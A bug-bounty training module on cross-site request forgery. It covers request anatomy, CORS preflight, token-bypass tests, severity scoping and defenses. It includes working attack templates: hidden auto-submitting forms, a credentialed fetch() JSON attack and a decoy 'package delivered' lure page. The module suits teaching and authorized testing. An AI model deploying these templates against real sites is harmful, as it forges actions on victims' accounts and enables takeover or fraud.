# CSRF Module 03 — The Anatomy of a CSRF Attack
> **Curriculum:** CSRF Mastery for Ethical Hacking & Bug Bounty  
> **Module:** 03 of 12  
> **Topic:** Attack Construction, Request Anatomy, Detection Methodology, PoC Building, Impact Scoping  
> **Level:** Intermediate — applies Module 01-02 theory to practical attack construction

---

## Table of Contents
1. [The Three Phases of a CSRF Attack](#1-the-three-phases-of-a-csrf-attack)
2. [The Three Conditions — Applied Checklist](#2-the-three-conditions--applied-checklist)
3. [Complete Request Anatomy](#3-complete-request-anatomy)
4. [Attacker Control Surface](#4-attacker-control-surface)
5. [HTML Triggers — Complete Reference](#5-html-triggers--complete-reference)
6. [Auto-Submit Mechanisms](#6-auto-submit-mechanisms)
7. [PoC Templates — Production Grade](#7-poc-templates--production-grade)
8. [Content-Type and CORS Preflight](#8-content-type-and-cors-preflight)
9. [CORS Misconfiguration and CSRF](#9-cors-misconfiguration-and-csrf)
10. [What the Server Cannot Distinguish](#10-what-the-server-cannot-distinguish)
11. [CSRF is Blind — Impact Boundaries](#11-csrf-is-blind--impact-boundaries)
12. [Impact Scoping and Severity](#12-impact-scoping-and-severity)
13. [CSRF Token Bypass Testing](#13-csrf-token-bypass-testing)
14. [Detection Methodology — Full Checklist](#14-detection-methodology--full-checklist)
15. [Natural vs Formal CSRF Mitigations](#15-natural-vs-formal-csrf-mitigations)
16. [Key Terminology Reference](#16-key-terminology-reference)
17. [Common Misconceptions](#17-common-misconceptions)
18. [Bug Bounty Reference](#18-bug-bounty-reference)
19. [Module 3 Summary — What You Must Know Cold](#19-module-3-summary--what-you-must-know-cold)

---

## 1. The Three Phases of a CSRF Attack

```
┌─────────────────────────────────────────────────────────────────┐
│                  CSRF ATTACK PHASES                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PHASE 1 — RECONNAISSANCE                                       │
│  ├── Identify state-changing endpoints                          │
│  ├── Determine authentication mechanism (cookie vs header)      │
│  ├── Inspect cookie attributes (SameSite, HttpOnly, Secure)     │
│  ├── Check for CSRF tokens in requests                          │
│  ├── Check Origin/Referer validation                            │
│  └── Map required request parameters                            │
│                                                                 │
│  PHASE 2 — CONSTRUCTION                                         │
│  ├── Build request replicating the legitimate action            │
│  ├── Choose correct HTML trigger for the method                 │
│  ├── Implement auto-execution on page load                      │
│  ├── Test locally before delivery                               │
│  └── Host on attacker-controlled domain                         │
│                                                                 │
│  PHASE 3 — DELIVERY                                             │
│  ├── Cause victim to load the page while authenticated          │
│  ├── Vectors: phishing email, malicious ad, XSS, chat link      │
│  └── Server receives indistinguishable request                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. The Three Conditions — Applied Checklist

Use this as a triage checklist for every endpoint:

```
CONDITION 1 — ACTIVE AUTHENTICATED SESSION
  Question: Does the victim have a valid session cookie?
  Check:    Is the endpoint only accessible when logged in?
  If NO:    No CSRF impact (unauthenticated action = no privilege to abuse)

CONDITION 2 — AUTOMATIC CREDENTIAL ATTACHMENT
  Question: Will the browser attach the session cookie cross-site?
  Check:    What is the SameSite value?
    SameSite=None    → Cookie sent on all cross-site requests ✓
    SameSite absent  → Treated as Lax in modern browsers
    SameSite=Lax     → Sent on cross-site top-level GET only
    SameSite=Strict  → Never sent cross-site ✗
  If NO:    Simple attack fails; check for bypass (timing window, GET fallback)

CONDITION 3 — NO INTENT VERIFICATION
  Question: Can the server distinguish a forged request from a legitimate one?
  Check:    Is there a CSRF token? Is Origin/Referer validated?
  If NO:    Endpoint is vulnerable; proceed to PoC
  If YES:   Test bypass scenarios (Module 7)
```

---

## 3. Complete Request Anatomy

When a CSRF attack fires, the browser constructs the following request. Each field's source and attacker control level:

```
POST /api/account/change-email HTTP/1.1

┌───────────────────────────────────────────────────────────────┐
│ FIELD           │ VALUE                  │ SOURCE   │ CONTROL │
├─────────────────┼────────────────────────┼──────────┼─────────┤
│ Host            │ app.victim.com         │ Form URL │ YES     │
│ Cookie          │ session=abc123         │ Browser  │ NO      │
│ Origin          │ https://evil.com       │ Browser  │ NO      │
│ Referer         │ https://evil.com/x     │ Browser  │ NO*     │
│ Content-Type    │ application/x-www-...  │ Browser  │ LIMITED │
│ Request body    │ email=attacker@...     │ Form     │ YES     │
│ Query string    │ ?param=value           │ URL      │ YES     │
│ Custom headers  │ X-CSRF-Token: ???      │ N/A      │ NO**    │
└───────────────────────────────────────────────────────────────┘

* Referer can be suppressed via <meta name="referrer" content="no-referrer">
** Custom headers require CORS preflight; cannot be set by plain HTML
```

**Key insight:** The attacker controls the destination, body, and query string. The browser controls cookies, Origin, and content-type constraints. CSRF tokens require reading the page — which SOP prevents cross-origin.

---

## 4. Attacker Control Surface

### What the Attacker CAN Control

```
✓ Target URL (via form action or img/iframe src)
✓ HTTP method: GET (img/link/iframe/meta) or POST (form)
✓ Request body parameters (hidden form inputs)
✓ Query string parameters
✓ Content-Type: limited to simple types via HTML forms:
    - application/x-www-form-urlencoded (default POST)
    - multipart/form-data
    - text/plain
✓ Referer suppression (meta referrer policy)
```

### What the Attacker CANNOT Control

```
✗ Cookie values — browser attaches from its own jar; attacker cannot read or set
✗ Arbitrary request headers — custom headers trigger CORS preflight
✗ Content-Type: application/json — triggers preflight; not producible by HTML form
✗ Authorization header — cannot be set by form or img tag
✗ Response content — SOP blocks cross-origin reads (CSRF is blind)
✗ Session token value — HttpOnly + SOP prevent access
```

---

## 5. HTML Triggers — Complete Reference

### GET Request Triggers (fire automatically on page load)

```html
<!-- Image tag — most common GET trigger -->
<img src="https://target.com/action?param=value" style="display:none">

<!-- Script tag -->
<script src="https://target.com/action?param=value"></script>

<!-- iframe -->
<iframe src="https://target.com/action?param=value" style="display:none"></iframe>

<!-- Link prefetch (browser may pre-fetch) -->
<link rel="prefetch" href="https://target.com/action?param=value">

<!-- Meta refresh (top-level navigation — sends Lax cookies) -->
<meta http-equiv="refresh" content="0; url=https://target.com/action?param=value">
```

### POST Request Triggers

```html
<!-- Auto-submit form via body onload -->
<body onload="document.forms[0].submit()">
  <form action="https://target.com/action" method="POST" style="display:none">
    <input type="hidden" name="param" value="attacker_value">
  </form>
</body>

<!-- Auto-submit via JavaScript -->
<form id="csrf" action="https://target.com/action" method="POST">
  <input type="hidden" name="param" value="value">
</form>
<script>document.getElementById("csrf").submit();</script>
```

### Navigation Triggers (send SameSite=Lax cookies)

```html
<!-- User-click link (top-level GET navigation) -->
<a href="https://target.com/action?param=value">Click here</a>

<!-- JS redirect (no user interaction, still top-level) -->
<script>window.location.href = "https://target.com/action?param=value";</script>

<!-- JS replace -->
<script>window.location.replace("https://target.com/action?param=value");</script>
```

---

## 6. Auto-Submit Mechanisms

A CSRF PoC must fire without user interaction. Two reliable mechanisms:

### Method 1 — `body onload` (Recommended)

```html
<body onload="document.forms[0].submit()">
```

- Fires after full DOM is ready
- `document.forms[0]` references the first form on the page
- Most reliable cross-browser
- No user interaction required

### Method 2 — Inline Script After Form

```html
<form id="csrf-form" action="..." method="POST">
  ...
</form>
<script>document.getElementById("csrf-form").submit();</script>
```

- Fires immediately when script tag is parsed
- Form must appear before the script tag in HTML
- Equally effective

### Why `.submit()` Bypasses Form Validation

Calling `form.submit()` programmatically bypasses browser-native form validation (required fields, pattern checks). This is intentional — those validations are client-side UX, not security controls.

---

## 7. PoC Templates — Production Grade

### Standard POST CSRF

```html
<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
</head>
<body onload="document.forms[0].submit()">

  <form action="https://TARGET.com/ENDPOINT"
        method="POST"
        style="display:none">
    <input type="hidden" name="PARAM1" value="ATTACKER_VALUE">
    <input type="hidden" name="PARAM2" value="ATTACKER_VALUE">
  </form>

  <p>Please wait...</p>

</body>
</html>
```

### GET-Based CSRF

```html
<!DOCTYPE html>
<html>
<body>
  <!-- Fires immediately on page parse -->
  <img src="https://TARGET.com/ENDPOINT?PARAM=ATTACKER_VALUE"
       style="display:none"
       onerror="this.style.display='none'">
</body>
</html>
```

### JSON CSRF (CORS Misconfiguration Required)

```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch("https://TARGET.com/ENDPOINT", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    param1: "attacker_value",
    param2: "attacker_value"
  })
})
.then(response => {
  // Attacker can read response ONLY if CORS allows it
  // Access-Control-Allow-Origin: https://evil.com
  // Access-Control-Allow-Credentials: true
  return response.text();
})
.catch(err => console.log(err));
</script>
</body>
</html>
```

### Multipart Form CSRF

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://TARGET.com/upload"
        method="POST"
        enctype="multipart/form-data"
        style="display:none">
    <input type="hidden" name="field1" value="value1">
    <input type="hidden" name="action" value="delete">
  </form>
</body>
</html>
```

### Social Engineering Wrapper (for realistic delivery)

```html
<!DOCTYPE html>
<html>
<head>
  <title>Your package has been delivered</title>
  <style>
    body { font-family: Arial; text-align: center; padding: 50px; }
  </style>
</head>
<body onload="document.forms[0].submit()">

  <form action="https://TARGET.com/ENDPOINT"
        method="POST"
        style="display:none">
    <input type="hidden" name="PARAM" value="ATTACKER_VALUE">
  </form>

  <!-- Visible decoy content -->
  <h2>Verifying your identity...</h2>
  <p>Please wait while we redirect you.</p>

</body>
</html>
```

---

## 8. Content-Type and CORS Preflight

### Simple vs Preflighted Requests

CORS defines two request categories that determine CSRF exploitability via fetch():

```
SIMPLE REQUESTS (browser sends directly, no preflight):
  Methods:        GET, POST, HEAD
  Content-Types:  application/x-www-form-urlencoded
                  multipart/form-data
                  text/plain
  Headers:        Only CORS-safelisted headers
  
  → HTML forms can produce these
  → No CORS check before sending
  → Browser attaches cookies automatically
  → CSRF via HTML form is possible

PREFLIGHTED REQUESTS (browser sends OPTIONS first):
  Methods:        PUT, DELETE, PATCH
  Content-Types:  application/json
                  application/xml
                  anything not in simple list
  Headers:        Any custom header (X-CSRF-Token, Authorization, etc.)
  
  → HTML forms CANNOT produce these
  → Browser sends OPTIONS preflight before actual request
  → Server must respond with permissive CORS headers
  → CSRF via plain HTML is NOT possible
  → CSRF via fetch() requires CORS misconfiguration
```

### The Content-Type: application/json Nuance

```
Scenario: Endpoint requires Content-Type: application/json

Plain HTML form attack:
  Form sends → Content-Type: application/x-www-form-urlencoded
  Server rejects body or returns 400
  → Attack fails IF server strictly validates Content-Type

fetch() attack:
  fetch() with Content-Type: application/json
  → Triggers CORS preflight (OPTIONS request)
  → Server must respond: Access-Control-Allow-Origin: [attacker-origin]
                         Access-Control-Allow-Credentials: true
  → If CORS is permissive: fetch() proceeds with cookies → CSRF succeeds
  → If CORS is correct: preflight rejected → fetch() blocked

Conclusion: application/json raises the bar but is NOT a CSRF defense alone
```

---

## 9. CORS Misconfiguration and CSRF

Not all CORS misconfigurations enable CSRF. Understand the combinations:

### `Access-Control-Allow-Origin: *`

```
Effect on CSRF:
  ✗ Does NOT enable credentialed CSRF
  
Reason:
  fetch() with credentials: "include" + wildcard ACAO is FORBIDDEN by browsers
  Browser error: "Cannot use wildcard in Access-Control-Allow-Origin
                  when credentials flag is true"
  
What it enables:
  ✓ Unauthenticated cross-origin reads (no cookie needed)
  ✗ Does not enable reading authenticated responses
```

### `Access-Control-Allow-Origin: https://attacker.com` + `Access-Control-Allow-Credentials: true`

```
Effect on CSRF:
  ✓ ENABLES credentialed JSON CSRF
  
Reason:
  fetch() with credentials: "include" is allowed
  Browser attaches cookies to the request
  Server processes authenticated request
  Attacker can even READ the response (unlike standard CSRF)
  
This is the dangerous combination:
  - Specific attacker origin reflected OR
  - Origin header value blindly reflected back
```

### Origin Reflection Pattern (Common Misconfiguration)

```javascript
// Vulnerable server-side CORS handling
const origin = req.headers.origin;
res.setHeader('Access-Control-Allow-Origin', origin);  // reflects any origin
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

```
Attack:
  fetch() from https://evil.com sends Origin: https://evil.com
  Server reflects: Access-Control-Allow-Origin: https://evil.com
  + Access-Control-Allow-Credentials: true
  → Credentialed request allowed
  → Attacker can send AND read authenticated requests
  → Full CSRF + response read capability
```

### CORS Misconfiguration Test Procedure

```
1. Send request with Origin: https://evil.com
   Check response for Access-Control-Allow-Origin: https://evil.com
   + Access-Control-Allow-Credentials: true
   → Vulnerable to credentialed CSRF

2. Send request with Origin: null
   Some servers allowlist null (used in sandboxed iframes)
   Check response for Access-Control-Allow-Origin: null
   + Access-Control-Allow-Credentials: true
   → Vulnerable (use sandboxed iframe in PoC)

3. Send request with Origin: https://evil.victim.com
   Check if subdomain is trusted
   → Subdomain CORS trust may enable CSRF

4. Send request without Origin header
   Check if CORS headers still appear
   → Permissive CORS may allow all requests
```

---

## 10. What the Server Cannot Distinguish

At the server's network interface, a legitimate and forged request may be identical:

```
LEGITIMATE REQUEST:                    FORGED REQUEST:
POST /api/change-email HTTP/1.1        POST /api/change-email HTTP/1.1
Host: app.victim.com                   Host: app.victim.com
Cookie: session=abc123          ←→     Cookie: session=abc123
Content-Type: application/x-...        Content-Type: application/x-...
Origin: https://app.victim.com         Origin: https://evil.com  ← ONLY DIFFERENCE
                                                                     (if checked)
email=alice@victim.com                 email=attacker@example.com

Without Origin validation:
  Both requests are IDENTICAL from the server's perspective
  Server cannot tell which the user intended
```

**The only reliable server-side observable difference:** The `Origin` header. If the server does not check it, no distinction is possible.

---

## 11. CSRF is Blind — Impact Boundaries

CSRF is a **blind write attack**. The attacker cannot read server responses.

### What CSRF CAN Do

```
✓ Perform any state-changing action the victim can perform
✓ Change account details: email, password, username, phone
✓ Make financial transactions: transfers, payments, purchases
✓ Delete data: accounts, files, records
✓ Add/remove users, escalate privileges
✓ Submit forms with attacker-controlled values
✓ Trigger administrative actions
✓ Chain into account takeover (change email → password reset)
```

### What CSRF CANNOT Do

```
✗ Read server responses (SOP blocks cross-origin reads)
✗ Exfiltrate data directly
✗ Steal session tokens
✗ Bypass re-authentication prompts
✗ Know whether the attack succeeded (blind)
✗ Act outside the victim's permission scope
✗ Affect unauthenticated endpoints meaningfully
```

### When Blindness Matters

```
Blindness MATTERS when:
  - Action requires knowing current state (e.g., "change password" needs current password)
  - Action produces a secret you need (e.g., generate API key — you cannot read it)
  - Success depends on a condition you cannot observe

Blindness does NOT matter when:
  - Side effect is the goal (email change → password reset → account takeover)
  - Action is destructive (delete — you don't need to read anything)
  - Action adds attacker data (add attacker as admin)
  - Disruption is the goal (CSRF denial of service)
```

### Read-Only Endpoints Have No CSRF Impact

```
GET /api/export-data?format=csv

Attack: <img src="https://target.com/api/export-data?format=csv">

What happens:
  ✓ Request fires with victim's session cookie
  ✓ Server returns CSV data in response
  ✗ Attacker cannot read the response (SOP)
  ✗ <img> tries to render CSV as image — fails silently
  ✗ Data goes nowhere useful to attacker

Result: ZERO CSRF IMPACT on read-only endpoints
```

---

## 12. Impact Scoping and Severity

### Severity by Action

| Action | Severity | Reasoning |
|--------|----------|-----------|
| Change email → password reset → ATO | Critical | Full account takeover chain |
| Change password directly | Critical | Immediate account takeover |
| Add attacker as admin | Critical | Privilege escalation |
| Financial transaction | Critical/High | Direct financial loss |
| Account deletion | High | Permanent data loss |
| Delete critical data | High | Irreversible |
| Change security settings (2FA) | High | Weakens account security |
| Add authorized users | High | Unauthorized access grant |
| Social actions (post, follow) | Medium | Reputation/privacy impact |
| Notification preferences | Low | Minimal state change |
| UI preference changes | Low/Info | No security impact |

### Impact Chain Example — Email Change to ATO

```
CSRF → Change email to attacker@evil.com
  ↓
Attacker initiates password reset for victim account
  ↓
Reset link sent to attacker@evil.com (attacker controls inbox)
  ↓
Attacker clicks reset link, sets new password
  ↓
Attacker logs in with new credentials
  ↓
Full account takeover — victim locked out
```

This chain converts a "change email" CSRF into a Critical severity finding.

---

## 13. CSRF Token Bypass Testing

When a CSRF token is present, test every bypass before declaring the endpoint safe:

```
TEST 1 — Remove token entirely
  Request without csrf_token parameter
  If 200 OK: token not validated

TEST 2 — Empty token value
  csrf_token=
  If 200 OK: server checks presence, not value

TEST 3 — Random/invalid token
  csrf_token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
  If 200 OK: token not validated against session

TEST 4 — Cross-user token
  Log in as attacker → capture attacker's CSRF token
  Use attacker's token in victim's session request
  If 200 OK: token not tied to session (global token pool)

TEST 5 — Reuse old token
  Capture CSRF token, use it after logout/re-login
  If 200 OK: tokens not rotated/invalidated

TEST 6 — Method switch
  Convert POST to GET, remove token
  GET /endpoint?param=value (no token)
  If 200 OK: CSRF protection only on POST

TEST 7 — Parameter name manipulation
  Change csrf_token to _csrf_token, csrftoken, token, etc.
  Some parsers normalize parameter names

TEST 8 — Content-Type switch
  Change Content-Type: application/x-www-form-urlencoded
  to Content-Type: text/plain
  Some CSRF validators only run on specific content types

TEST 9 — Double parameter
  csrf_token=invalid&csrf_token=valid
  Some parsers take first value, validators take last (or vice versa)

TEST 10 — XSS extraction (if XSS exists)
  Use XSS to read CSRF token from DOM
  Include in forged request
  Defeats token protection entirely (covered in Module 7)
```

---

## 14. Detection Methodology — Full Checklist

```
STEP 1 — Identify state-changing endpoints
  ✓ POST/PUT/DELETE with side effects
  ✓ GET endpoints that modify server state
  ✓ Focus: account changes, financial actions, admin functions, data deletion

STEP 2 — Determine authentication mechanism
  ✓ Session cookie → assess CSRF surface
  ✓ Authorization: Bearer header → not CSRF vulnerable via browser
  ✓ Both present → assess cookie path

STEP 3 — Inspect cookie attributes (Set-Cookie headers)
  ✓ SameSite=None or absent → full CSRF surface
  ✓ SameSite=Lax → test GET-based state changes + timing window
  ✓ SameSite=Strict → very limited surface

STEP 4 — Check for CSRF tokens
  ✓ Inspect form HTML for hidden fields
  ✓ Inspect request headers for X-CSRF-Token, X-Requested-With
  ✓ Absent → likely vulnerable; proceed to PoC
  ✓ Present → run bypass test suite (Section 13)

STEP 5 — Check Origin/Referer validation
  ✓ Remove Origin header → does server accept?
  ✓ Send Origin: https://evil.com → does server reject?
  ✓ Send Origin: null → does server accept?
  ✓ Check Referer: remove it, change it

STEP 6 — Identify Content-Type requirements
  ✓ application/x-www-form-urlencoded → simple request, form-exploitable
  ✓ application/json → check CORS policy for preflight bypass
  ✓ multipart/form-data → simple request, form-exploitable

STEP 7 — Check CORS policy
  ✓ Send cross-origin request, check ACAO header
  ✓ Test: Origin: https://evil.com → reflected? + ACAC: true?
  ✓ Test: Origin: null → accepted?
  ✓ Wildcard ACAO alone is not credential-enabling

STEP 8 — Build and test minimal PoC
  ✓ Auto-submit form on attacker page
  ✓ Confirm action executes in victim session
  ✓ Document exact reproduction steps

STEP 9 — Scope the impact chain
  ✓ What is the direct action?
  ✓ What can the attacker do next? (full chain)
  ✓ Assign severity based on worst-case chain
```

---

## 15. Natural vs Formal CSRF Mitigations

Not all CSRF resistance comes from explicit security controls. Some actions are naturally resistant.

### Natural Mitigations (Not Formal Defenses)

```
REQUIRES KNOWN SECRET:
  Change password endpoint requires current password
  → Attacker doesn't know current password
  → Cannot forge complete request
  → Natural resistance (not a formal defense — if requirement removed, CSRF opens)

REQUIRES CAPTCHA:
  Action gated by CAPTCHA
  → Attacker cannot solve CAPTCHA cross-site
  → Natural resistance

REQUIRES KNOWN STATE:
  Action requires ID or value visible only on a page the attacker cannot read
  → e.g., "transfer from account ID [ID shown on dashboard]"
  → Attacker cannot read the ID (SOP)
  → Natural resistance
  → WARNING: If ID is predictable or guessable, this fails

REQUIRES RE-AUTHENTICATION:
  Action requires password or MFA confirmation
  → Strongest natural mitigation
  → Attacker cannot supply victim's credentials
  → Appropriate for critical actions (delete account, change email, add admin)
```

### Formal Mitigations (Explicit Security Controls)

```
CSRF TOKEN (Synchronizer Token Pattern)
  → Random secret per session embedded in forms
  → Validated server-side on every state-changing request
  → Formal defense — always intentional

SAMESITE COOKIE ATTRIBUTE
  → Browser-level control on cross-site cookie attachment
  → Formal defense built into cookie specification

ORIGIN/REFERER HEADER VALIDATION
  → Server checks request source header
  → Formal defense — defense-in-depth layer

CUSTOM REQUEST HEADER REQUIREMENT
  → Requires X-Requested-With or similar
  → Cannot be set by plain HTML cross-origin
  → Formal defense for AJAX endpoints
```

---

## 16. Key Terminology Reference

| Term | Definition |
|------|------------|
| **CSRF PoC** | Proof-of-concept HTML page that demonstrates the attack |
| **Auto-submit** | Form submission triggered automatically on page load without user interaction |
| **Simple request** | Cross-origin request that doesn't trigger CORS preflight (specific methods + content types) |
| **Preflighted request** | Cross-origin request preceded by OPTIONS check before actual request |
| **CORS preflight** | Browser's OPTIONS request to verify server allows the cross-origin request |
| **Blind attack** | Attack where the attacker cannot read the server's response |
| **State-changing action** | Server operation that modifies data — the target of CSRF |
| **Idempotent** | Operation that produces same result if repeated; GET should be idempotent |
| **Natural mitigation** | CSRF resistance arising from action requirements, not explicit security controls |
| **Formal defense** | Explicitly implemented CSRF control (token, SameSite, Origin check) |
| **Impact chain** | Full sequence of consequences from a vulnerability to worst-case outcome |
| **ACAO** | Access-Control-Allow-Origin header |
| **ACAC** | Access-Control-Allow-Credentials header |
| **Origin reflection** | Server copies the Origin header value back into ACAO (common misconfiguration) |
| **Token bypass** | Technique to submit a request without a valid CSRF token |

---

## 17. Common Misconceptions

### ❌ "Content-Type: application/json prevents CSRF"
**Wrong.** It raises the bar by requiring a CORS preflight, but a misconfigured CORS policy can still allow credentialed cross-origin fetch() requests with JSON bodies. Not a standalone defense.

### ❌ "CSRF can steal data by triggering GET requests"
**Wrong.** CSRF is blind — the attacker cannot read responses. A GET CSRF triggers the request but the response goes to the victim's browser, which the attacker cannot access. Read-only endpoints have zero CSRF impact.

### ❌ "Access-Control-Allow-Origin: * enables CSRF"
**Wrong.** Wildcard ACAO cannot be combined with credentials: include. The browser blocks this combination. CSRF via fetch() requires a specific origin in ACAO + ACAC: true.

### ❌ "If there's a CSRF token, the endpoint is safe"
**Wrong.** Tokens must be correctly generated, stored, and validated. A token that isn't tied to the session, isn't validated, or can be extracted via XSS provides no protection.

### ❌ "Re-authentication fully prevents CSRF"
**Correct only for the protected action.** Re-authentication prevents CSRF on the specific action it gates. Other actions without re-auth are still vulnerable.

### ❌ "CSRF requires the attacker to know the victim's session token"
**Wrong.** The attacker never needs to know or see the token. They cause the browser — which holds the token — to send it. The session token is completely irrelevant to the attacker.

### ❌ "Checking the password in a change-password form prevents all CSRF"
**Partially correct.** The current-password requirement creates a natural mitigation for that specific endpoint. But other state-changing endpoints (email change, account deletion, etc.) may still be vulnerable.

---

## 18. Bug Bounty Reference

### Reconnaissance Targets

```
High-value state-changing endpoints to find:
  POST /account/change-email
  POST /account/change-password
  POST /account/delete
  POST /admin/add-user
  POST /admin/change-role
  POST /transfer or /payment
  POST /api/keys/generate
  POST /settings/security
  POST /oauth/authorize
  GET  /account/delete?confirm=true  ← GET + state change = high priority
```

### PoC Checklist for Bug Reports

```
Before submitting:
  ✓ PoC auto-fires without victim interaction (beyond page load)
  ✓ PoC tested in clean browser session (victim's perspective)
  ✓ PoC demonstrates complete impact chain
  ✓ PoC uses minimal/clean HTML
  ✓ Reproduction steps are explicit and numbered
  ✓ Expected vs actual behavior documented
  ✓ Severity justified with impact chain
```

### Bug Report Template

```markdown
## Title
CSRF in [POST /endpoint] allows [action] on behalf of authenticated user

## Severity
[Critical / High / Medium / Low] — [one-line justification]

## Summary
An attacker who causes an authenticated victim to visit a malicious page
can [specific action]. No victim interaction beyond loading the page is required.

## Steps to Reproduce
1. Log in to [target] as victim user
2. In a separate tab, open the following HTML page:
   [paste PoC]
3. Observe that [action] occurs on the victim's account

## Impact Chain
[action] via CSRF
  ↓
[next step]
  ↓
[worst-case outcome]

## Root Cause
The endpoint [POST /endpoint] performs a state-changing action without verifying
that the request originated from the application. No CSRF token is present.
The session cookie has [SameSite attribute] which [does/does not] prevent this
specific attack vector because [reason].

## Remediation
1. Implement synchronizer CSRF tokens on all state-changing endpoints
2. Set SameSite=Lax or Strict on session cookies
3. Validate the Origin header on all POST requests

## PoC
[clean minimal HTML]
```

---

## 19. Module 3 Summary — What You Must Know Cold

```
ATTACK PHASES:
✓ Recon → Construction → Delivery
✓ Attacker controls: URL, method, body, query string
✓ Attacker cannot control: cookies, Origin header, custom headers, response

HTML TRIGGERS:
✓ GET: <img>, <script>, <iframe>, <meta refresh>, window.location
✓ POST: <form> with body onload or inline script auto-submit
✓ Auto-submit: body onload="document.forms[0].submit()"

CONTENT-TYPE:
✓ application/x-www-form-urlencoded → simple request → directly exploitable
✓ application/json → preflight required → needs CORS misconfiguration
✓ Content-Type alone is NOT a CSRF defense

CORS AND CSRF:
✓ ACAO: * alone does NOT enable credentialed CSRF
✓ ACAO: [specific origin] + ACAC: true = enables JSON CSRF via fetch()
✓ Origin reflection + ACAC: true = dangerous misconfiguration

CSRF IS BLIND:
✓ Attacker cannot read responses — ever
✓ Read-only endpoints have ZERO CSRF impact
✓ Impact comes from side effects, not data access

CSRF TOKEN BYPASSES:
✓ Remove token, empty token, random value, cross-user token
✓ Method switch (GET instead of POST)
✓ Content-Type switch
✓ XSS extraction (Module 7)

IMPACT SCOPING:
✓ Always trace the full chain to worst-case outcome
✓ Email change alone is Medium; email change → ATO chain is Critical
✓ Severity = impact of worst-case chain, not just immediate action

NATURAL MITIGATIONS (not formal defenses):
✓ Current password required → attacker can't supply it
✓ CAPTCHA → attacker can't solve cross-site
✓ Unpredictable required parameter → attacker can't read it (SOP)
✓ Re-authentication → strongest natural mitigation
```

---

*Next: Module 04 — GET vs POST CSRF*  
*Why method matters less than developers think, HTTP semantics vs security semantics,*
*and why GET-based state changes are the most exploitable CSRF surface*